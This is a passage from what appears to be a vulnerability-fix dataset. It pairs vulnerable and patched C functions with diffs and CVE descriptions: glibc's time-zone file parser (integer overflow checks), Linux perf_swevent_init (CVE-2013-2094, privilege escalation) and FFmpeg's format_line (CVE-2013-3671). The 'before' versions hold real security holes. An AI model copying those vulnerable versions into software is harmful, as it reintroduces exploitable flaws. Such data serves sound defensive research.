x[8];\n      if (__builtin_expect (fread_unlocked (x, 1, trans_width, f)\n\t\t\t    != trans_width, 0))\n\tgoto lose;\n      if (sizeof (time_t) == 4 || trans_width == 4)\n\tleaps[i].transition = (time_t) decode (x);\n      else\n\tleaps[i].transition = (time_t) decode64 (x);\n\n      if (__builtin_expect (fread_unlocked (x, 1, 4, f) != 4, 0))\n\tgoto lose;\n      leaps[i].change = (long int) decode (x);\n    }\n\n  for (i = 0; i < num_isstd; ++i)\n    {\n      int c = getc_unlocked (f);\n      if (__builtin_expect (c == EOF, 0))\n\tgoto lose;\n      types[i].isstd = c != 0;\n    }\n  while (i < num_types)\n    types[i++].isstd = 0;\n\n  for (i = 0; i < num_isgmt; ++i)\n    {\n      int c = getc_unlocked (f);\n      if (__builtin_expect (c == EOF, 0))\n\tgoto lose;\n      types[i].isgmt = c != 0;\n    }\n  while (i < num_types)\n    types[i++].isgmt = 0;\n\n  /* Read the POSIX TZ-style information if possible.  */\n  if (sizeof (time_t) == 8 && tzspec != NULL)\n    {\n      /* Skip over the newline first.  */\n      if (getc_unlocked (f) != '\\n'\n\t  || (fread_unlocked (tzspec, 1, tzspec_len - 1, f)\n\t      != tzspec_len - 1))\n\ttzspec = NULL;\n      else\n\ttzspec[tzspec_len - 1] = '\\0';\n    }\n  else if (sizeof (time_t) == 4 && tzhead.tzh_version[0] != '\\0')\n    {\n      /* Get the TZ string.  */\n      if (__builtin_expect (fread_unlocked ((void *) &tzhead, sizeof (tzhead),\n\t\t\t\t\t    1, f) != 1, 0)\n\t  || (memcmp (tzhead.tzh_magic, TZ_MAGIC, sizeof (tzhead.tzh_magic))\n\t      != 0))\n\tgoto lose;\n\n      size_t num_transitions2 = (size_t) decode (tzhead.tzh_timecnt);\n      size_t num_types2 = (size_t) decode (tzhead.tzh_typecnt);\n      size_t chars2 = (size_t) decode (tzhead.tzh_charcnt);\n      size_t num_leaps2 = (size_t) decode (tzhead.tzh_leapcnt);\n      size_t num_isstd2 = (size_t) decode (tzhead.tzh_ttisstdcnt);\n      size_t num_isgmt2 = (size_t) decode (tzhead.tzh_ttisgmtcnt);\n\n      /* Position the stream before the second header.  */\n      size_t to_skip = (num_transitions2 * (8 + 1)\n\t\t\t+ num_types2 * 6\n\t\t\t+ chars2\n\t\t\t+ num_leaps2 * 12\n\t\t\t+ num_isstd2\n\t\t\t+ num_isgmt2);\n      off_t off;\n      if (fseek (f, to_skip, SEEK_CUR) != 0\n\t  || (off = ftello (f)) < 0\n\t  || st.st_size < off + 2)\n\tgoto lose;\n\n      tzspec_len = st.st_size - off - 1;\n      char *tzstr = alloca (tzspec_len);\n      if (getc_unlocked (f) != '\\n'\n\t  || (fread_unlocked (tzstr, 1, tzspec_len - 1, f) != tzspec_len - 1))\n\tgoto lose;\n      tzstr[tzspec_len - 1] = '\\0';\n      tzspec = __tzstring (tzstr);\n    }\n\n  /* Don't use an empty TZ string.  */\n  if (tzspec != NULL && tzspec[0] == '\\0')\n    tzspec = NULL;\n\n  fclose (f);\n\n  /* First \"register\" all timezone names.  */\n  for (i = 0; i < num_types; ++i)\n    (void) __tzstring (&zone_names[types[i].idx]);\n\n  /* Find the standard and daylight time offsets used by the rule file.\n     We choose the offsets in the types of each flavor that are\n     transitioned to earliest in time.  */\n  __tzname[0] = NULL;\n  __tzname[1] = NULL;\n  for (i = num_transitions; i > 0; )\n    {\n      int type = type_idxs[--i];\n      int dst = types[type].isdst;\n\n      if (__tzname[dst] == NULL)\n\t{\n\t  int idx = types[type].idx;\n\n\t  __tzname[dst] = __tzstring (&zone_names[idx]);\n\n\t  if (__tzname[1 - dst] != NULL)\n\t    break;\n\t}\n    }\n  if (__tzname[0] == NULL)\n    {\n      /* This should only happen if there are no transition rules.\n\t In this case there should be only one single type.  */\n      assert (num_types == 1);\n      __tzname[0] = __tzstring (zone_names);\n    }\n  if (__tzname[1] == NULL)\n    __tzname[1] = __tzname[0];\n\n  compute_tzname_max (chars);\n\n  if (num_transitions == 0)\n    /* Use the first rule (which should also be the only one).  */\n    rule_stdoff = rule_dstoff = types[0].offset;\n  else\n    {\n      int stdoff_set = 0, dstoff_set = 0;\n      rule_stdoff = rule_dstoff = 0;\n      i = num_transitions - 1;\n      do\n\t{\n\t  if (!stdoff_set && !types[type_idxs[i]].isdst)\n\t    {\n\t      stdoff_set = 1;\n\t      rule_stdoff = types[type_idxs[i]].offset;\n\t    }\n\t  else if (!dstoff_set && types[type_idxs[i]].isdst)\n\t    {\n\t      dstoff_set = 1;\n\t      rule_dstoff = types[type_idxs[i]].offset;\n\t    }\n\t  if (stdoff_set && dstoff_set)\n\t    break;\n\t}\n      while (i-- > 0);\n\n      if (!dstoff_set)\n\trule_dstoff = rule_stdoff;\n    }\n\n  __daylight = rule_stdoff != rule_dstoff;\n  __timezone = -rule_stdoff;\n\n  __use_tzfile = 1;\n  return;\n\n lose:\n  fclose (f);\n ret_free_transitions:\n  free ((void *) transitions);\n  transitions = NULL;\n}",
        "func": "void\n__tzfile_read (const char *file, size_t extra, char **extrap)\n{\n  static const char default_tzdir[] = TZDIR;\n  size_t num_isstd, num_isgmt;\n  register FILE *f;\n  struct tzhead tzhead;\n  size_t chars;\n  register size_t i;\n  size_t total_size;\n  size_t types_idx;\n  size_t leaps_idx;\n  int was_using_tzfile = __use_tzfile;\n  int trans_width = 4;\n  size_t tzspec_len;\n\n  if (sizeof (time_t) != 4 && sizeof (time_t) != 8)\n    abort ();\n\n  __use_tzfile = 0;\n\n  if (file == NULL)\n    /* No user specification; use the site-wide default.  */\n    file = TZDEFAULT;\n  else if (*file == '\\0')\n    /* User specified the empty string; use UTC with no leap seconds.  */\n    goto ret_free_transitions;\n  else\n    {\n      /* We must not allow to read an arbitrary file in a setuid\n\t program.  So we fail for any file which is not in the\n\t directory hierachy starting at TZDIR\n\t and which is not the system wide default TZDEFAULT.  */\n      if (__libc_enable_secure\n\t  && ((*file == '/'\n\t       && memcmp (file, TZDEFAULT, sizeof TZDEFAULT)\n\t       && memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))\n\t      || strstr (file, \"../\") != NULL))\n\t/* This test is certainly a bit too restrictive but it should\n\t   catch all critical cases.  */\n\tgoto ret_free_transitions;\n    }\n\n  if (*file != '/')\n    {\n      const char *tzdir;\n      unsigned int len, tzdir_len;\n      char *new, *tmp;\n\n      tzdir = getenv (\"TZDIR\");\n      if (tzdir == NULL || *tzdir == '\\0')\n\t{\n\t  tzdir = default_tzdir;\n\t  tzdir_len = sizeof (default_tzdir) - 1;\n\t}\n      else\n\ttzdir_len = strlen (tzdir);\n      len = strlen (file) + 1;\n      new = (char *) __alloca (tzdir_len + 1 + len);\n      tmp = __mempcpy (new, tzdir, tzdir_len);\n      *tmp++ = '/';\n      memcpy (tmp, file, len);\n      file = new;\n    }\n\n  /* If we were already using tzfile, check whether the file changed.  */\n  struct stat64 st;\n  if (was_using_tzfile\n      && stat64 (file, &st) == 0\n      && tzfile_ino == st.st_ino && tzfile_dev == st.st_dev\n      && tzfile_mtime == st.st_mtime)\n    {\n      /* Nothing to do.  */\n      __use_tzfile = 1;\n      return;\n    }\n\n  /* Note the file is opened with cancellation in the I/O functions\n     disabled and if available FD_CLOEXEC set.  */\n  f = fopen (file, \"rce\");\n  if (f == NULL)\n    goto ret_free_transitions;\n\n  /* Get information about the file we are actually using.  */\n  if (fstat64 (fileno (f), &st) != 0)\n    {\n      fclose (f);\n      goto ret_free_transitions;\n    }\n\n  free ((void *) transitions);\n  transitions = NULL;\n\n  /* Remember the inode and device number and modification time.  */\n  tzfile_dev = st.st_dev;\n  tzfile_ino = st.st_ino;\n  tzfile_mtime = st.st_mtime;\n\n  /* No threads reading this stream.  */\n  __fsetlocking (f, FSETLOCKING_BYCALLER);\n\n read_again:\n  if (__builtin_expect (fread_unlocked ((void *) &tzhead, sizeof (tzhead),\n\t\t\t\t\t1, f) != 1, 0)\n      || memcmp (tzhead.tzh_magic, TZ_MAGIC, sizeof (tzhead.tzh_magic)) != 0)\n    goto lose;\n\n  num_transitions = (size_t) decode (tzhead.tzh_timecnt);\n  num_types = (size_t) decode (tzhead.tzh_typecnt);\n  chars = (size_t) decode (tzhead.tzh_charcnt);\n  num_leaps = (size_t) decode (tzhead.tzh_leapcnt);\n  num_isstd = (size_t) decode (tzhead.tzh_ttisstdcnt);\n  num_isgmt = (size_t) decode (tzhead.tzh_ttisgmtcnt);\n\n  /* For platforms with 64-bit time_t we use the new format if available.  */\n  if (sizeof (time_t) == 8 && trans_width == 4\n      && tzhead.tzh_version[0] != '\\0')\n    {\n      /* We use the 8-byte format.  */\n      trans_width = 8;\n\n      /* Position the stream before the second header.  */\n      size_t to_skip = (num_transitions * (4 + 1)\n\t\t\t+ num_types * 6\n\t\t\t+ chars\n\t\t\t+ num_leaps * 8\n\t\t\t+ num_isstd\n\t\t\t+ num_isgmt);\n      if (fseek (f, to_skip, SEEK_CUR) != 0)\n\tgoto lose;\n\n      goto read_again;\n    }\n\n  if (__builtin_expect (num_transitions\n\t\t\t> ((SIZE_MAX - (__alignof__ (struct ttinfo) - 1))\n\t\t\t   / (sizeof (time_t) + 1)), 0))\n    goto lose;\n  total_size = num_transitions * (sizeof (time_t) + 1);\n  total_size = ((total_size + __alignof__ (struct ttinfo) - 1)\n\t\t& ~(__alignof__ (struct ttinfo) - 1));\n  types_idx = total_size;\n  if (__builtin_expect (num_types\n\t\t\t> (SIZE_MAX - total_size) / sizeof (struct ttinfo), 0))\n    goto lose;\n  total_size += num_types * sizeof (struct ttinfo);\n  if (__builtin_expect (chars > SIZE_MAX - total_size, 0))\n    goto lose;\n  total_size += chars;\n  if (__builtin_expect (__alignof__ (struct leap) - 1\n\t\t\t> SIZE_MAX - total_size, 0))\n    goto lose;\n  total_size = ((total_size + __alignof__ (struct leap) - 1)\n\t\t& ~(__alignof__ (struct leap) - 1));\n  leaps_idx = total_size;\n  if (__builtin_expect (num_leaps\n\t\t\t> (SIZE_MAX - total_size) / sizeof (struct leap), 0))\n    goto lose;\n  total_size += num_leaps * sizeof (struct leap);\n  tzspec_len = 0;\n  if (sizeof (time_t) == 8 && trans_width == 8)\n    {\n      off_t rem = st.st_size - ftello (f);\n      if (__builtin_expect (rem < 0\n\t\t\t    || (size_t) rem < (num_transitions * (8 + 1)\n\t\t\t\t\t       + num_types * 6\n\t\t\t\t\t       + chars), 0))\n\tgoto lose;\n      tzspec_len = (size_t) rem - (num_transitions * (8 + 1)\n\t\t\t\t   + num_types * 6\n\t\t\t\t   + chars);\n      if (__builtin_expect (num_leaps > SIZE_MAX / 12\n\t\t\t    || tzspec_len < num_leaps * 12, 0))\n\tgoto lose;\n      tzspec_len -= num_leaps * 12;\n      if (__builtin_expect (tzspec_len < num_isstd, 0))\n\tgoto lose;\n      tzspec_len -= num_isstd;\n      if (__builtin_expect (tzspec == 0 || tzspec_len - 1 < num_isgmt, 0))\n\tgoto lose;\n      tzspec_len -= num_isgmt + 1;\n      if (__builtin_expect (SIZE_MAX - total_size < tzspec_len, 0))\n\tgoto lose;\n    }\n  if (__builtin_expect (SIZE_MAX - total_size - tzspec_len < extra, 0))\n    goto lose;\n\n  /* Allocate enough memory including the extra block requested by the\n     caller.  */\n  transitions = (time_t *) malloc (total_size + tzspec_len + extra);\n  if (transitions == NULL)\n    goto lose;\n\n  type_idxs = (unsigned char *) transitions + (num_transitions\n\t\t\t\t\t       * sizeof (time_t));\n  types = (struct ttinfo *) ((char *) transitions + types_idx);\n  zone_names = (char *) types + num_types * sizeof (struct ttinfo);\n  leaps = (struct leap *) ((char *) transitions + leaps_idx);\n  if (sizeof (time_t) == 8 && trans_width == 8)\n    tzspec = (char *) leaps + num_leaps * sizeof (struct leap) + extra;\n  else\n    tzspec = NULL;\n  if (extra > 0)\n    *extrap = (char *) &leaps[num_leaps];\n\n  if (sizeof (time_t) == 4 || __builtin_expect (trans_width == 8, 1))\n    {\n      if (__builtin_expect (fread_unlocked (transitions, trans_width + 1,\n\t\t\t\t\t    num_transitions, f)\n\t\t\t    != num_transitions, 0))\n\tgoto lose;\n    }\n  else\n    {\n      if (__builtin_expect (fread_unlocked (transitions, 4, num_transitions, f)\n\t\t\t    != num_transitions, 0)\n\t  || __builtin_expect (fread_unlocked (type_idxs, 1, num_transitions,\n\t\t\t\t\t       f) != num_transitions, 0))\n\tgoto lose;\n    }\n\n  /* Check for bogus indices in the data file, so we can hereafter\n     safely use type_idxs[T] as indices into `types' and never crash.  */\n  for (i = 0; i < num_transitions; ++i)\n    if (__builtin_expect (type_idxs[i] >= num_types, 0))\n      goto lose;\n\n  if ((BYTE_ORDER != BIG_ENDIAN && (sizeof (time_t) == 4 || trans_width == 4))\n      || (BYTE_ORDER == BIG_ENDIAN && sizeof (time_t) == 8\n\t  && trans_width == 4))\n    {\n      /* Decode the transition times, stored as 4-byte integers in\n\t network (big-endian) byte order.  We work from the end of\n\t the array so as not to clobber the next element to be\n\t processed when sizeof (time_t) > 4.  */\n      i = num_transitions;\n      while (i-- > 0)\n\ttransitions[i] = decode ((char *) transitions + i * 4);\n    }\n  else if (BYTE_ORDER != BIG_ENDIAN && sizeof (time_t) == 8)\n    {\n      /* Decode the transition times, stored as 8-byte integers in\n\t network (big-endian) byte order.  */\n      for (i = 0; i < num_transitions; ++i)\n\ttransitions[i] = decode64 ((char *) transitions + i * 8);\n    }\n\n  for (i = 0; i < num_types; ++i)\n    {\n      unsigned char x[4];\n      int c;\n      if (__builtin_expect (fread_unlocked (x, 1, sizeof (x), f) != sizeof (x),\n\t\t\t    0))\n\tgoto lose;\n      c = getc_unlocked (f);\n      if (__builtin_expect ((unsigned int) c > 1u, 0))\n\tgoto lose;\n      types[i].isdst = c;\n      c = getc_unlocked (f);\n      if (__builtin_expect ((size_t) c > chars, 0))\n\t/* Bogus index in data file.  */\n\tgoto lose;\n      types[i].idx = c;\n      types[i].offset = (long int) decode (x);\n    }\n\n  if (__builtin_expect (fread_unlocked (zone_names, 1, chars, f) != chars, 0))\n    goto lose;\n\n  for (i = 0; i < num_leaps; ++i)\n    {\n      unsigned char x[8];\n      if (__builtin_expect (fread_unlocked (x, 1, trans_width, f)\n\t\t\t    != trans_width, 0))\n\tgoto lose;\n      if (sizeof (time_t) == 4 || trans_width == 4)\n\tleaps[i].transition = (time_t) decode (x);\n      else\n\tleaps[i].transition = (time_t) decode64 (x);\n\n      if (__builtin_expect (fread_unlocked (x, 1, 4, f) != 4, 0))\n\tgoto lose;\n      leaps[i].change = (long int) decode (x);\n    }\n\n  for (i = 0; i < num_isstd; ++i)\n    {\n      int c = getc_unlocked (f);\n      if (__builtin_expect (c == EOF, 0))\n\tgoto lose;\n      types[i].isstd = c != 0;\n    }\n  while (i < num_types)\n    types[i++].isstd = 0;\n\n  for (i = 0; i < num_isgmt; ++i)\n    {\n      int c = getc_unlocked (f);\n      if (__builtin_expect (c == EOF, 0))\n\tgoto lose;\n      types[i].isgmt = c != 0;\n    }\n  while (i < num_types)\n    types[i++].isgmt = 0;\n\n  /* Read the POSIX TZ-style information if possible.  */\n  if (sizeof (time_t) == 8 && tzspec != NULL)\n    {\n      /* Skip over the newline first.  */\n      if (getc_unlocked (f) != '\\n'\n\t  || (fread_unlocked (tzspec, 1, tzspec_len - 1, f)\n\t      != tzspec_len - 1))\n\ttzspec = NULL;\n      else\n\ttzspec[tzspec_len - 1] = '\\0';\n    }\n  else if (sizeof (time_t) == 4 && tzhead.tzh_version[0] != '\\0')\n    {\n      /* Get the TZ string.  */\n      if (__builtin_expect (fread_unlocked ((void *) &tzhead, sizeof (tzhead),\n\t\t\t\t\t    1, f) != 1, 0)\n\t  || (memcmp (tzhead.tzh_magic, TZ_MAGIC, sizeof (tzhead.tzh_magic))\n\t      != 0))\n\tgoto lose;\n\n      size_t num_transitions2 = (size_t) decode (tzhead.tzh_timecnt);\n      size_t num_types2 = (size_t) decode (tzhead.tzh_typecnt);\n      size_t chars2 = (size_t) decode (tzhead.tzh_charcnt);\n      size_t num_leaps2 = (size_t) decode (tzhead.tzh_leapcnt);\n      size_t num_isstd2 = (size_t) decode (tzhead.tzh_ttisstdcnt);\n      size_t num_isgmt2 = (size_t) decode (tzhead.tzh_ttisgmtcnt);\n\n      /* Position the stream before the second header.  */\n      size_t to_skip = (num_transitions2 * (8 + 1)\n\t\t\t+ num_types2 * 6\n\t\t\t+ chars2\n\t\t\t+ num_leaps2 * 12\n\t\t\t+ num_isstd2\n\t\t\t+ num_isgmt2);\n      off_t off;\n      if (fseek (f, to_skip, SEEK_CUR) != 0\n\t  || (off = ftello (f)) < 0\n\t  || st.st_size < off + 2)\n\tgoto lose;\n\n      tzspec_len = st.st_size - off - 1;\n      char *tzstr = alloca (tzspec_len);\n      if (getc_unlocked (f) != '\\n'\n\t  || (fread_unlocked (tzstr, 1, tzspec_len - 1, f) != tzspec_len - 1))\n\tgoto lose;\n      tzstr[tzspec_len - 1] = '\\0';\n      tzspec = __tzstring (tzstr);\n    }\n\n  /* Don't use an empty TZ string.  */\n  if (tzspec != NULL && tzspec[0] == '\\0')\n    tzspec = NULL;\n\n  fclose (f);\n\n  /* First \"register\" all timezone names.  */\n  for (i = 0; i < num_types; ++i)\n    (void) __tzstring (&zone_names[types[i].idx]);\n\n  /* Find the standard and daylight time offsets used by the rule file.\n     We choose the offsets in the types of each flavor that are\n     transitioned to earliest in time.  */\n  __tzname[0] = NULL;\n  __tzname[1] = NULL;\n  for (i = num_transitions; i > 0; )\n    {\n      int type = type_idxs[--i];\n      int dst = types[type].isdst;\n\n      if (__tzname[dst] == NULL)\n\t{\n\t  int idx = types[type].idx;\n\n\t  __tzname[dst] = __tzstring (&zone_names[idx]);\n\n\t  if (__tzname[1 - dst] != NULL)\n\t    break;\n\t}\n    }\n  if (__tzname[0] == NULL)\n    {\n      /* This should only happen if there are no transition rules.\n\t In this case there should be only one single type.  */\n      assert (num_types == 1);\n      __tzname[0] = __tzstring (zone_names);\n    }\n  if (__tzname[1] == NULL)\n    __tzname[1] = __tzname[0];\n\n  compute_tzname_max (chars);\n\n  if (num_transitions == 0)\n    /* Use the first rule (which should also be the only one).  */\n    rule_stdoff = rule_dstoff = types[0].offset;\n  else\n    {\n      int stdoff_set = 0, dstoff_set = 0;\n      rule_stdoff = rule_dstoff = 0;\n      i = num_transitions - 1;\n      do\n\t{\n\t  if (!stdoff_set && !types[type_idxs[i]].isdst)\n\t    {\n\t      stdoff_set = 1;\n\t      rule_stdoff = types[type_idxs[i]].offset;\n\t    }\n\t  else if (!dstoff_set && types[type_idxs[i]].isdst)\n\t    {\n\t      dstoff_set = 1;\n\t      rule_dstoff = types[type_idxs[i]].offset;\n\t    }\n\t  if (stdoff_set && dstoff_set)\n\t    break;\n\t}\n      while (i-- > 0);\n\n      if (!dstoff_set)\n\trule_dstoff = rule_stdoff;\n    }\n\n  __daylight = rule_stdoff != rule_dstoff;\n  __timezone = -rule_stdoff;\n\n  __use_tzfile = 1;\n  return;\n\n lose:\n  fclose (f);\n ret_free_transitions:\n  free ((void *) transitions);\n  transitions = NULL;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -132,23 +132,58 @@\n       goto read_again;\n     }\n \n+  if (__builtin_expect (num_transitions\n+\t\t\t> ((SIZE_MAX - (__alignof__ (struct ttinfo) - 1))\n+\t\t\t   / (sizeof (time_t) + 1)), 0))\n+    goto lose;\n   total_size = num_transitions * (sizeof (time_t) + 1);\n   total_size = ((total_size + __alignof__ (struct ttinfo) - 1)\n \t\t& ~(__alignof__ (struct ttinfo) - 1));\n   types_idx = total_size;\n-  total_size += num_types * sizeof (struct ttinfo) + chars;\n+  if (__builtin_expect (num_types\n+\t\t\t> (SIZE_MAX - total_size) / sizeof (struct ttinfo), 0))\n+    goto lose;\n+  total_size += num_types * sizeof (struct ttinfo);\n+  if (__builtin_expect (chars > SIZE_MAX - total_size, 0))\n+    goto lose;\n+  total_size += chars;\n+  if (__builtin_expect (__alignof__ (struct leap) - 1\n+\t\t\t> SIZE_MAX - total_size, 0))\n+    goto lose;\n   total_size = ((total_size + __alignof__ (struct leap) - 1)\n \t\t& ~(__alignof__ (struct leap) - 1));\n   leaps_idx = total_size;\n+  if (__builtin_expect (num_leaps\n+\t\t\t> (SIZE_MAX - total_size) / sizeof (struct leap), 0))\n+    goto lose;\n   total_size += num_leaps * sizeof (struct leap);\n-  tzspec_len = (sizeof (time_t) == 8 && trans_width == 8\n-\t\t? st.st_size - (ftello (f)\n-\t\t\t\t+ num_transitions * (8 + 1)\n-\t\t\t\t+ num_types * 6\n-\t\t\t\t+ chars\n-\t\t\t\t+ num_leaps * 12\n-\t\t\t\t+ num_isstd\n-\t\t\t\t+ num_isgmt) - 1 : 0);\n+  tzspec_len = 0;\n+  if (sizeof (time_t) == 8 && trans_width == 8)\n+    {\n+      off_t rem = st.st_size - ftello (f);\n+      if (__builtin_expect (rem < 0\n+\t\t\t    || (size_t) rem < (num_transitions * (8 + 1)\n+\t\t\t\t\t       + num_types * 6\n+\t\t\t\t\t       + chars), 0))\n+\tgoto lose;\n+      tzspec_len = (size_t) rem - (num_transitions * (8 + 1)\n+\t\t\t\t   + num_types * 6\n+\t\t\t\t   + chars);\n+      if (__builtin_expect (num_leaps > SIZE_MAX / 12\n+\t\t\t    || tzspec_len < num_leaps * 12, 0))\n+\tgoto lose;\n+      tzspec_len -= num_leaps * 12;\n+      if (__builtin_expect (tzspec_len < num_isstd, 0))\n+\tgoto lose;\n+      tzspec_len -= num_isstd;\n+      if (__builtin_expect (tzspec == 0 || tzspec_len - 1 < num_isgmt, 0))\n+\tgoto lose;\n+      tzspec_len -= num_isgmt + 1;\n+      if (__builtin_expect (SIZE_MAX - total_size < tzspec_len, 0))\n+\tgoto lose;\n+    }\n+  if (__builtin_expect (SIZE_MAX - total_size - tzspec_len < extra, 0))\n+    goto lose;\n \n   /* Allocate enough memory including the extra block requested by the\n      caller.  */",
        "diff_line_info": {
            "deleted_lines": [
                "  total_size += num_types * sizeof (struct ttinfo) + chars;",
                "  tzspec_len = (sizeof (time_t) == 8 && trans_width == 8",
                "\t\t? st.st_size - (ftello (f)",
                "\t\t\t\t+ num_transitions * (8 + 1)",
                "\t\t\t\t+ num_types * 6",
                "\t\t\t\t+ chars",
                "\t\t\t\t+ num_leaps * 12",
                "\t\t\t\t+ num_isstd",
                "\t\t\t\t+ num_isgmt) - 1 : 0);"
            ],
            "added_lines": [
                "  if (__builtin_expect (num_transitions",
                "\t\t\t> ((SIZE_MAX - (__alignof__ (struct ttinfo) - 1))",
                "\t\t\t   / (sizeof (time_t) + 1)), 0))",
                "    goto lose;",
                "  if (__builtin_expect (num_types",
                "\t\t\t> (SIZE_MAX - total_size) / sizeof (struct ttinfo), 0))",
                "    goto lose;",
                "  total_size += num_types * sizeof (struct ttinfo);",
                "  if (__builtin_expect (chars > SIZE_MAX - total_size, 0))",
                "    goto lose;",
                "  total_size += chars;",
                "  if (__builtin_expect (__alignof__ (struct leap) - 1",
                "\t\t\t> SIZE_MAX - total_size, 0))",
                "    goto lose;",
                "  if (__builtin_expect (num_leaps",
                "\t\t\t> (SIZE_MAX - total_size) / sizeof (struct leap), 0))",
                "    goto lose;",
                "  tzspec_len = 0;",
                "  if (sizeof (time_t) == 8 && trans_width == 8)",
                "    {",
                "      off_t rem = st.st_size - ftello (f);",
                "      if (__builtin_expect (rem < 0",
                "\t\t\t    || (size_t) rem < (num_transitions * (8 + 1)",
                "\t\t\t\t\t       + num_types * 6",
                "\t\t\t\t\t       + chars), 0))",
                "\tgoto lose;",
                "      tzspec_len = (size_t) rem - (num_transitions * (8 + 1)",
                "\t\t\t\t   + num_types * 6",
                "\t\t\t\t   + chars);",
                "      if (__builtin_expect (num_leaps > SIZE_MAX / 12",
                "\t\t\t    || tzspec_len < num_leaps * 12, 0))",
                "\tgoto lose;",
                "      tzspec_len -= num_leaps * 12;",
                "      if (__builtin_expect (tzspec_len < num_isstd, 0))",
                "\tgoto lose;",
                "      tzspec_len -= num_isstd;",
                "      if (__builtin_expect (tzspec == 0 || tzspec_len - 1 < num_isgmt, 0))",
                "\tgoto lose;",
                "      tzspec_len -= num_isgmt + 1;",
                "      if (__builtin_expect (SIZE_MAX - total_size < tzspec_len, 0))",
                "\tgoto lose;",
                "    }",
                "  if (__builtin_expect (SIZE_MAX - total_size - tzspec_len < extra, 0))",
                "    goto lose;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-2094",
        "func_name": "torvalds/linux/perf_swevent_init",
        "description": "The perf_swevent_init function in kernel/events/core.c in the Linux kernel before 3.8.9 uses an incorrect integer data type, which allows local users to gain privileges via a crafted perf_event_open system call.",
        "git_url": "https://github.com/torvalds/linux/commit/8176cced706b5e5d15887584150764894e94e02f",
        "commit_title": "perf: Treat attr.config as u64 in perf_swevent_init()",
        "commit_text": " Trinity discovered that we fail to check all 64 bits of attr.config passed by user space, resulting to out-of-bounds access of the perf_swevent_enabled array in sw_perf_event_destroy().  Introduced in commit b0a873ebb (\"perf: Register PMU implementations\").  Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: davej@redhat.com Cc: Paul Mackerras <paulus@samba.org> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Link: http://lkml.kernel.org/r/1365882554-30259-1-git-send-email-tt.rantala@gmail.com",
        "func_before": "static int perf_swevent_init(struct perf_event *event)\n{\n\tint event_id = event->attr.config;\n\n\tif (event->attr.type != PERF_TYPE_SOFTWARE)\n\t\treturn -ENOENT;\n\n\t/*\n\t * no branch sampling for software events\n\t */\n\tif (has_branch_stack(event))\n\t\treturn -EOPNOTSUPP;\n\n\tswitch (event_id) {\n\tcase PERF_COUNT_SW_CPU_CLOCK:\n\tcase PERF_COUNT_SW_TASK_CLOCK:\n\t\treturn -ENOENT;\n\n\tdefault:\n\t\tbreak;\n\t}\n\n\tif (event_id >= PERF_COUNT_SW_MAX)\n\t\treturn -ENOENT;\n\n\tif (!event->parent) {\n\t\tint err;\n\n\t\terr = swevent_hlist_get(event);\n\t\tif (err)\n\t\t\treturn err;\n\n\t\tstatic_key_slow_inc(&perf_swevent_enabled[event_id]);\n\t\tevent->destroy = sw_perf_event_destroy;\n\t}\n\n\treturn 0;\n}",
        "func": "static int perf_swevent_init(struct perf_event *event)\n{\n\tu64 event_id = event->attr.config;\n\n\tif (event->attr.type != PERF_TYPE_SOFTWARE)\n\t\treturn -ENOENT;\n\n\t/*\n\t * no branch sampling for software events\n\t */\n\tif (has_branch_stack(event))\n\t\treturn -EOPNOTSUPP;\n\n\tswitch (event_id) {\n\tcase PERF_COUNT_SW_CPU_CLOCK:\n\tcase PERF_COUNT_SW_TASK_CLOCK:\n\t\treturn -ENOENT;\n\n\tdefault:\n\t\tbreak;\n\t}\n\n\tif (event_id >= PERF_COUNT_SW_MAX)\n\t\treturn -ENOENT;\n\n\tif (!event->parent) {\n\t\tint err;\n\n\t\terr = swevent_hlist_get(event);\n\t\tif (err)\n\t\t\treturn err;\n\n\t\tstatic_key_slow_inc(&perf_swevent_enabled[event_id]);\n\t\tevent->destroy = sw_perf_event_destroy;\n\t}\n\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,6 @@\n static int perf_swevent_init(struct perf_event *event)\n {\n-\tint event_id = event->attr.config;\n+\tu64 event_id = event->attr.config;\n \n \tif (event->attr.type != PERF_TYPE_SOFTWARE)\n \t\treturn -ENOENT;",
        "diff_line_info": {
            "deleted_lines": [
                "\tint event_id = event->attr.config;"
            ],
            "added_lines": [
                "\tu64 event_id = event->attr.config;"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-3671",
        "func_name": "ffmpeg/format_line",
        "description": "The format_line function in log.c in libavutil in FFmpeg before 1.2.1 uses inapplicable offset data during a certain category calculation, which allows remote attackers to cause a denial of service (invalid pointer dereference and application crash) via crafted data that triggers a log message.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=cc0dd86580b3257f22a4981a79eb5fa6804182b6",
        "commit_title": "",
        "commit_text": "avutil/log: Fix context pointer used for get_category()  Fixes calling a random pointer  (cherry picked from commit 7edb984dd051b6919d7d8471c70499273f31b0fa)  ",
        "func_before": "static void format_line(void *ptr, int level, const char *fmt, va_list vl,\n                        char part[3][LINE_SZ], int part_size, int *print_prefix, int type[2])\n{\n    AVClass* avc = ptr ? *(AVClass **) ptr : NULL;\n    part[0][0] = part[1][0] = part[2][0] = 0;\n    if(type) type[0] = type[1] = AV_CLASS_CATEGORY_NA + 16;\n    if (*print_prefix && avc) {\n        if (avc->parent_log_context_offset) {\n            AVClass** parent = *(AVClass ***) (((uint8_t *) ptr) +\n                                   avc->parent_log_context_offset);\n            if (parent && *parent) {\n                snprintf(part[0], part_size, \"[%s @ %p] \",\n                         (*parent)->item_name(parent), parent);\n                if(type) type[0] = get_category(((uint8_t *) ptr) + avc->parent_log_context_offset);\n            }\n        }\n        snprintf(part[1], part_size, \"[%s @ %p] \",\n                 avc->item_name(ptr), ptr);\n        if(type) type[1] = get_category(ptr);\n    }\n\n    vsnprintf(part[2], part_size, fmt, vl);\n\n    *print_prefix = strlen(part[2]) && part[2][strlen(part[2]) - 1] == '\\n';\n}",
